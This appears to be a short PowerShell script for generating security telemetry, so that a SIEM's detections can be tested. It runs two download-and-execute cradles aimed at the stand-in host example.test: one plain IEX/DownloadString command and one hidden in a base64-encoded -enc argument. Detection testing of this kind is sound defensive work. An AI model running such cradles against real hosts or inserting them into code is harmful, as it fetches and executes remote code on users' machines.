# Suspicious-ish commands to create telemetry
powershell -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.test/script.ps1')"
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AdABlAHMAdAAvAHMALgBwAHMAMQAnACkA
Write-Host "Done. Check your SIEM."
